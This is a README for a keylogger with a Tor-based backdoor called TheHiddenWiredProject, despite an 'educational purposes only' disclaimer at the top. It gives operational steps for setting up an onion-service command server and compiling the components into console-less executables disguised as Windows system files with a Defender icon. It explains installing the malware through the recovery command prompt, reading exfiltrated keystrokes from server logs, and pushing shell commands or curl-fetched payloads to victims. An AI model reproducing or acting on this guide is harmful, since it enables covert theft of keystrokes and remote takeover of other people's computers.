THIS PROJECT WAS CREATED FOR EDUCATIONAL AND EXPERIMENTAL PURPOSES ONLY. DO NOT USE IT ON MACHINES THAT ARE NOT YOUR OWN OR THAT ARE NOT PART OF YOUR VIRTUAL LAB!
EVEN IF THE CHOSEN NAMES ARE ULTRA STEALTH, THAT DOES NOT MEAN IT SHOULD BE USED IMPROPERLY!
I take no responsibility for any direct, indirect, or collateral damage resulting from improper or unauthorized use of this tool. Use is entirely under the user's own responsibility.
  

--------------------------------------- TheHiddenWiredProject ---------------------------------------

What is TheHiddenWiredProject?
TheHiddenWiredProject (THWP) is a keylogger with an integrated backdoor designed to be ultra stealthy
because all traffic generated is routed through Tor!

Is it safe?
Yeah bro, it's 100% safe, you can modify the code however you want without issues, while Tor helps
you hide your server (used to listen to the keylogger and use the backdoor).

So I need to set up a server?
Yeah, it's necessary to have a high enough level of anonymity

Is it ready to use?
Absolutely not, you have to compile it yourself, it's super easy, keep reading and I'll explain

Do you recommend it?
Absolutely yes! This tool is extremely compact, yet at the same time ultra stealthy,
you'd never find a keylogger with a Tor-based backdoor on the internet!

------------ The Brains Behind THWP ------------
Isass.py ---> Tor Proxy
SecurityHealthSystray.bat ---> Starts proxy, Brain, and Tor
WMIHost.py ---> THWP (Brain)
wuasrv.exe ---> Tor.exe (Downloaded from the official site, but renamed)
wuasrvs.py ---> Delayed Tor launch to avoid errors
installer.bat ---> Installer from WindowsPE

----------------------------------------------------------------------------------------------------

Let's move on to the boring theory that's necessary to configure the server and compile THWP

Starting with the required tools...

A PC or VM with Linux (I recommend a Debian-based distro like Debian, Ubuntu, Mint, etc.)
A stable internet connection (at least 2Mbitps)

----------------------------------------------------------------------------------------------------
Create and configure the Tor server:

#To avoid issues, become root with "sudo su"

#install apache and tor
sudo apt install apache2 tor

#run at startup automatically
sudo systemctl enable apache2
sudo systemctl enable tor

#start the daemons
sudo systemctl start apache2
sudo systemctl start tor

#configure the apache server
cd /var/www/html
sudo rm **
sudo mkdir payloads_httpcmd
cd payloads_httpcmd
sudo nano default.txt (this is where the commands the target will execute every 60 seconds go)

#edit the torrc file
sudo nano /etc/tor/torrc

#Add the following information at the end of the file:

HiddenServiceDir /var/lib/tor/serverTHWP
HiddenServicePort 80 127.0.0.1:80

#The first string "HiddenServiceDir" specifies where tor will save the server config (DO NOT USE CUSTOM DIRECTORY TO AVOID ISSUES, LEAVE IT AS IS)
#The second string hosts on port 80

#Now you need to restart Tor to apply the changes
sudo systemctl restart tor

#If you have doubts go to: https://community.torproject.org/onion-services/setup/
#Or ask ChatGPT

#Now you need to see your tor domain, you can find it with:
cat /var/lib/tor/serverTHWP/hostname

#To avoid issues, become root with "sudo su"

----------------------------------------------------------------------------------------------------

Now you need to configure TheHiddenWiredProject so it routes traffic to your domain,
so edit the file Isass.py, find a variable called "TARGET_ONION" (you’ll find it at the beginning),
and put your domain there (the one ending in .onion that you found in the hostname file)

----------------------------------------------------------------------------------------------------

Now everything is ready! You can test the functionality on a Windows VM, if everything works you can compile everything!

To compile everything you need a Windows machine, we’ll use nuitka to turn our python files into executables.

1) Install Python on the Windows machine (Not from MStore but from the official site)
2) Now open the terminal and type: pip install nuitka (If pip is not found, restart Windows after installing Python)
3) Now type: nuitka --onefile --windows-disable-console file.py

#--onefile = single .exe file
#--windows-disable-console = no prompt when executed

4) Run nuitka for every .py file (Isass.py, WMIHost.py, wuasrvs.py)
5) After compiling all the .py files you need to compile SecurityHealthSystray.bat with Bat-To-Exe-Converter (Look it up online) NOTE: INSTALLER.BAT MUST REMAIN RAW, DO NOT COMPILE IT!
6) Add the defender icon to the .bat file inside the compiler to get an .exe with Defender icon
----------------------------------------------------------------------------------------------------

Now you’re almost done!
Copy the compiled project onto a USB drive, copy the file installer.bat to the main directory of the USB, delete the "WPE" folder
and the result should be this:

E:\\Isass.exe
E:\\Installer.bat
E:\\SecurityHealthSystray.exe
E:\\WMIHost.exe
E:\\wuasrv.exe
E:\\wuasrvs.exe

If it doesn’t match, you messed something up.


How do I install it??
1) Boot Windows
2) Once you are at the lock screen, go to the shutdown menu, hold "SHIFT" while clicking "Restart"
3) You should see on screen "Please wait"
4) After the reboot go to: Troubleshoot > Advanced options > Command prompt
5) Now find the letter of the USB (varies from PC to PC), try from C to J (just type the letter followed by a colon, like "c:")
6) Once you find the USB, run installer.bat
7) The PC will reboot by itself and TheHiddenWiredProject will be installed!
8) Have fun!
----------------------------------------------------------------------------------------------------

How do I check the keys pressed?
Pressed keys are saved on the server at "/var/log/apache2/access.log" in base32 in 32-character stacks, you need to decode them from base32 to plaintext, just look online for "base32 to text", paste the request and you'll see the pressed keys.

Example:
root@debianVM:/var/log/apache2# cat access.log
127.0.0.1 - - "GET /UNIQUE_CODE_GENERATED/MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA" 404
127.0.0.1 - - "GET /UNIQUE_CODE_GENERATED/ORSXG5BBEE======" 404

We only consider the base32 part, so this: MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA and this: ORSXG5BBEE======
if we decode them we get:

stack1 "MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA" = hi, this is a 
stack2 "ORSXG5BBEE======" = test!!

----------------------------------------------------------------------------------------------------

To execute code on the machine via the backdoor, just edit the file: /var/www/html/payloads_httpcmd/default.txt
and write Windows shell code, and it will be executed with the privileges of the current user, we can also download files with curl and execute them.
But be careful, you have to make sure that the shell code is not executed in a loop, because otherwise you risk messing things up, so once you see
the request for the payload, remove the content of default.txt, otherwise the code will be executed every 60 seconds!

----------------------------------------------------------------------------------------------------

HAVE FUN IN AN ETHICAL AND HEALTHY WAY, WITHOUT CAUSING REAL DAMAGE TO PEOPLE, DATA, OR SYSTEMS THAT DO NOT BELONG TO YOU!

                                                             100% created with the mind of ElektroWindows :)
